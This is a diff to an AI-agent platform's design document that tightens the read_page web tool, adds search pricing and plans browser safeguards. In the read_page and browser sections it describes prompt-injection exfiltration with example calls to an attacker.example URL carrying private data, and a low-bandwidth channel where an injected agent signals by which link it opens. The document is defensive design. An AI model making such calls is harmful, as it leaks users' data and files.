@@ -172,6 +172,7 @@ These ids are fixed. Both repos use them.
 - **Hermes:** the lead gets the same role prompts to use with its built-in delegation, one level deep.
 - **How many at once:** at most 3 specialists per job to start with.
 - **Why Scout has so few tools:** text from a web page is not trusted. Scout can't run commands or use the user's apps, so a page can't make it send or delete anything.
+- **Known limit on Hermes** (from the agent-image work, 2026-10-04): the pinned Hermes version has no tool list per delegated task. On Claude Code a specialist's tool list is enforced; on Hermes it is only an instruction in the role prompt. So Scout's "search and read only" holds by tools on Claude Code and by instruction on Hermes. The controls that hold on both engines are on the platform: approvals for risky app actions, and the seen-address rule of `read_page` (section 5.1).
 
 **On the platform** (this repo):
 
@@ -386,28 +387,42 @@ The web app lives in `user-frontend/` and is built from `openapi.yaml` + `ignore
 | schedule_reminder / create_automation / list / cancel | Save + register the timer (plan limits apply) |
 | get_profile | Name, timezone, plan, connected apps |
 | web_search | Scout's search. Asks the search provider from the server and returns titles, links and snippets. A **paid tool**: its cost × 2.5 in credits (section 7.2) |
-| read_page | Scout's page reader. Fetches one public web page from the server and returns its text. Free |
+| read_page | Scout's page reader. Fetches one public web page from the server and returns its text and links. Only an address already seen for this user (their own messages, a search result, a link on a page already read). Free |
 
 Every call is audit-logged and triggers a vm-manager *Touch*. `/mcp` is closed to the internet (section 4).
 
 - **What needs approval** (`integrations/catalog.ts`): an action whose name has a risky word (send, reply, delete, pay, share, post, merge, close, update…), and, since 2026-10-03, a **GitHub action that writes a comment or a review** (its name has COMMENT or REVIEW and it isn't a read). Other people read those, so they count as sending to others. Comment actions of other apps are unchanged.
 
-- **Scout's tools** (decided 2026-10-03). They run in the api, never in the container, so the container's network stays locked.
+- **Scout's tools** (decided 2026-10-03, built 2026-10-04). They run in the api, never in the container, so the container's network stays locked.
   - **`read_page(url)`:**
+    - **Only an address that was already seen for this user** (decided 2026-10-04). `read_page` is the first way out of the container that needs no approval. Without a rule, one injected instruction (in a web page, an email, a file) could make any agent call `read_page("https://attacker.example/?d=<private data>")` and hand over the user's data, files or Claude sign-in. So the address must match, exactly after normalising, one the platform has seen for this user:
+      - **(a)** an address in the **user's own messages**: their last 100 messages from the past 7 days, on any chat. Only what the user wrote counts. The agent's own messages, automation instructions (the agent writes those) and app events (an email's text) do not;
+      - **(b)** a **result of `web_search`**;
+      - **(c)** a **link on a page `read_page` already returned.** The tool returns a page's first 50 links for this reason.
+      - **Anything else is refused,** with an error that tells the agent to search first or to ask the user for the link.
+      - **Normalising** drops `http`/`https`, a leading `www.`, a trailing slash and the fragment, and nothing else: the path and the whole query string must match exactly. **The address that is fetched is the one that was seen,** not the agent's spelling of it, so the choice of spelling carries nothing.
+      - **Redirects follow the same rule.** A redirect is followed only to an address that was seen, or to the same address in another spelling (`http` to `https`, with or without `www.`). Any other redirect is refused, on the same site too. This is stricter than the leak needs (a redirect's target is chosen by the site, not by the agent) and it costs some pages; it is the careful starting point and can be loosened to "same site" later.
+      - **Where it is kept:** (b) and (c) in Redis, one set per user, for 24 hours, at most 500 addresses (the oldest go first). (a) is read from the user's messages when asked, so nothing is stored twice.
+      - **What it does not stop.** A hostile page can offer many links, and an injected agent can signal a little by which one it opens: a few bits per read, at most 30 reads a minute. The caps (50 links a page, 500 addresses) keep that slow and the activity log shows every read. Search queries go to the search provider, not to a site.
+      - **Why this rule is the one that matters:** on Claude Code, Scout's "search and read only" limit is enforced by its tool list. On Hermes it is only an instruction (section 0.7), and the lead and the other specialists have `read_page` on both engines. This check is on the platform, so it holds for every agent on both.
+      - **Known cost:** an automation that reads a fixed page ("every morning read this page") works while the link is in the user's recent messages. After that the agent must find the page by search or ask for the link again. Keeping such links with the automation is not built.
     - **Only `http` and `https`,** on ports 80 and 443, with no user name or password in the URL.
-    - **Only public addresses.** The host is looked up, and the page is refused if **any** of its addresses is private, loopback, link-local (this covers the cloud metadata address `169.254.169.254`), carrier NAT, multicast, reserved, or the IPv6 forms of those. Host names with no dot, `localhost`, `.local`, `.internal`, and the platform's own hosts (the api, LiteLLM, the vm-manager) are refused by name.
-    - **Checked again when connecting.** The connection is made only to an address that passed the check, so a host can't answer "public" to the check and "private" to the connection (DNS rebinding).
-    - **Redirects** are followed by hand, at most 5, and every hop is checked the same way.
-    - **Limits:** 15 seconds in total, 2 MB of page, text types only (HTML, plain text, JSON, XML). The answer is the page's readable text (scripts, styles and markup removed), cut at 20,000 characters.
+    - **Only public addresses.** The host is looked up, and the page is refused if **any** of its addresses is private, loopback, link-local (this covers the cloud metadata address `169.254.169.254`), carrier NAT, multicast, reserved, or the IPv6 forms of those (only global IPv6 addresses pass; IPv4 written inside an IPv6 address is refused). Host names with no dot, `localhost`, `.local`, `.internal`, and the platform's own hosts (the api, LiteLLM, the vm-manager, taken from the settings) are refused by name. A host written as a number is checked as the address it is.
+    - **Checked again when connecting.** The connection is made only to the address that passed the check (the request is pinned to it; the host name is still used for the certificate), so a host can't answer "public" to the check and "private" to the connection (DNS rebinding). Every request opens its own connection.
+    - **Redirects** are followed by hand, at most 5, and every hop is checked the same way from the start: the address checks here and the seen-address rule above.
+    - **Limits:** 15 seconds in total, 2 MB of page (a longer page is read up to 2 MB and marked as cut), text types only (HTML, plain text, JSON, XML). The answer is the page's readable text (scripts, styles and markup removed), cut at 20,000 characters.
+    - **What is sent:** a plain GET with a fixed user agent. No cookies, no sign-in, nothing about the user.
     - **Rate limit:** 30 pages a minute per user.
     - **The text is not trusted.** The tool's description tells the agent to treat it as information, never as instructions. Scout has no shell and no app actions (section 0.7).
-    - The activity log saves the page's address without its query string.
+    - The activity log saves the page's address without its query string. A refused address is written to the activity log too (`read_page_refused`) and to the server log, also without its query string: a refusal can be an injected instruction at work, and the user should be able to see it.
+    - `robots.txt` is not read: this is one page fetched for one user's question, not a crawler.
   - **`web_search(query)`:**
-    - **A small provider interface,** chosen by `WEB_SEARCH_PROVIDER`. One provider is built: **Brave Search API** (`GET /res/v1/web/search`, key in `X-Subscription-Token`; $5 per 1,000 searches when checked on 2026-10-03).
+    - **A small provider interface,** chosen by `WEB_SEARCH_PROVIDER`. One provider is built: **Brave Search API** (`GET https://api.search.brave.com/res/v1/web/search`, key in `X-Subscription-Token`). Its "Search" plan was **$5 per 1,000 searches** when checked on 2026-10-04, with $5 of free credit each month (the first 1,000 searches) and 50 searches a second.
     - **No key set (`BRAVE_SEARCH_API_KEY`):** the tool answers that search isn't set up. It is a normal answer, not an error, so the turn goes on.
-    - **Rate limit:** 20 searches a minute per user. At most 10 results per search.
+    - **Rate limit:** 20 searches a minute per user. At most 10 results per search (the default is 5), each with a title, a link and a snippet.
     - **Refused at zero credits,** like an app action that changes something.
-    - **Charged only on success** (section 7.2).
+    - **Charged only on success** (section 7.2). `WEB_SEARCH_COST_USD` is what one search costs us (default 0.005).
+    - A search the provider fails is an error the agent sees; the turn goes on and nothing is charged.
 
 - **App connections:** a connect link saves the connection as `pending`. Three things move it to `active` (or `expired` / `error`), whichever comes first:
   - Composio's webhook (`/webhooks/composio`),
@@ -558,6 +573,7 @@ _Updated 2026-10-03 (crew package): browser use is a Max feature, a user can cho
 
 - **The price is the tool's real cost × 2.5,** as for the AI. One search costs us $0.005 (Brave, `WEB_SEARCH_COST_USD`), so it is 1.25 credits.
 - **Credits are whole numbers, so fractions carry over,** the way awake time does: the platform keeps the user's running total of paid-tool cost and charges each whole credit as it is reached. With search that is 1 credit for three searches and 2 for the fourth: 5 credits for 4 searches, exactly × 2.5. A call never costs less than 1 credit.
+  - **Where the running total lives:** in the ledger. Each paid-tool charge saves what the call cost us (`meta.costMicroUsd`), and the next charge adds up the user's earlier ones under the user's credit lock. There is no separate counter to drift.
 - **Only success is charged.** A search the provider refuses, or one that isn't set up, costs nothing.
 - **At zero credits** a paid tool is refused before it runs.
 - **A turn reversed as our fault** gives back the paid-tool credits charged during that turn.
@@ -847,6 +863,7 @@ A small negative balance (one turn's overrun) is allowed and recovered from the 
 - [ ] Approvals before sending to others, deleting or paying; audit log for every action
 - [ ] Pull-request review: comments run without approval only on repos the user turned review on for, only the four named actions, never approve, merge, reply or another repo; the agent can't turn it on; the instruction carries no text from the pull request
 - [ ] `read_page` reaches public addresses only: private, loopback, link-local, metadata and internal hosts are refused, at every redirect and again when connecting; limits on time, size and redirects; rate limited
+- [ ] `read_page` can't be used to send data out: it fetches only an address already seen for this user (their own messages, a `web_search` result, a link on a page already read), at every redirect too. An address the agent made up is refused. The future browser tools need the same rule for every navigation (section 11)
 - [ ] Coupon rules from 7.7; rate limits on redeem, link codes and login-linked endpoints
 - [ ] Nightly off-server backups with a tested restore
 
@@ -871,7 +888,7 @@ A small negative balance (one turn's overrun) is allowed and recovered from the 
 | **Server impact** | The test server has about 5.5 GB for containers: about 15 idle ones today. A browser turn takes the room of 4 of them, so the awake cap must fall or the server must grow. The image grows by several hundred MB, and Chromium under gVisor is slower and needs its own flags | No change to the awake cap or the image |
 | **The locked network** | **Lost for that container.** A browser must reach any site, so the egress proxy would have to allow every domain. Then anything in the container (the user's files, memory, cloned code, a Claude Code sign-in) can be sent anywhere by one injected instruction | **Kept.** The container still reaches only the api, LiteLLM and git. The browser is outside it |
 | **Logged-in sessions** | Cookies would live in the user's `/data` volume on our server, and in the nightly backup | Cookies would live at the provider (Browserbase calls it a context, encrypted at rest). A third party holds them. **Proposed for launch: no saved logins at all** (public pages only) |
-| **Prompt injection** | The browser sits next to the user's data with an open network. This is the dangerous mix | The page can only reach what Scout can: `web_search`, `read_page` and the browser tools. Scout has no shell and no app actions. The worst case is Scout typing something into a page |
+| **Prompt injection** | The browser sits next to the user's data with an open network. This is the dangerous mix, and the platform can't check where the browser goes | The page can only reach what Scout can: `web_search`, `read_page` and the browser tools. Navigation goes through the platform, so the seen-address rule can be applied to it (section 11.5). The worst case is Scout typing something into a page. On Hermes, Scout's tool limits are only instructions (section 0.7), so the platform's checks are what counts |
 | **Metering browser minutes** | The Bridge reports browser seconds; the vm-manager already stores them per awake period and the usage sync already reads them | The api opens and closes every session, so it knows the seconds. They are added to the same usage sync and the same `browserCredits` |
 | **Plan check** | In the vm-manager and the image | In the tool: not on Max → the tool says so |
 | **Work to build** | Image, vm-manager (memory by plan, egress rules, metering), Bridge tools | Platform tools, one provider client, a session table, the sync. One repo |
@@ -909,6 +926,8 @@ Why:
 4. **It is the smaller build,** in one repo.
 
 Proposed limits for the first version: Max plan only; one browser session per user; closed after 2 idle minutes and after 15 minutes at most; public pages only (no saved logins, no proxies, no captcha solving); the same address rules as `read_page` for every page the browser is sent to; refused at zero credits; metered per second and charged at 2 credits per minute through the usage sync.
+
+**Navigation needs the seen-address rule too** (added 2026-10-04). A browser that opens any address the agent types is the same way out as an unchecked `read_page`: `browser_open("https://attacker.example/?d=<private data>")`. So `browser_open` must take only an address already seen for this user (section 5.1), and links the browser shows count as seen, like links on a read page. Two things are harder than with `read_page` and need their own answer before the browser is built: **typing** (`browser_type` puts agent-chosen text into a page, which is a way out by itself; the first version could allow typing only into a search box on a seen page, or ask for approval), and **requests the page makes by itself** (scripts, images and redirects, which a hosted browser fetches without asking us). With option (a) the platform can't apply the rule at all: the browser sits in the container and the open network is the way out.
 
 **What the founder decides:** option (a) or (b); if (b), which provider and who opens the account; whether Scout may ever stay logged in to a site, and where those cookies may live.
 
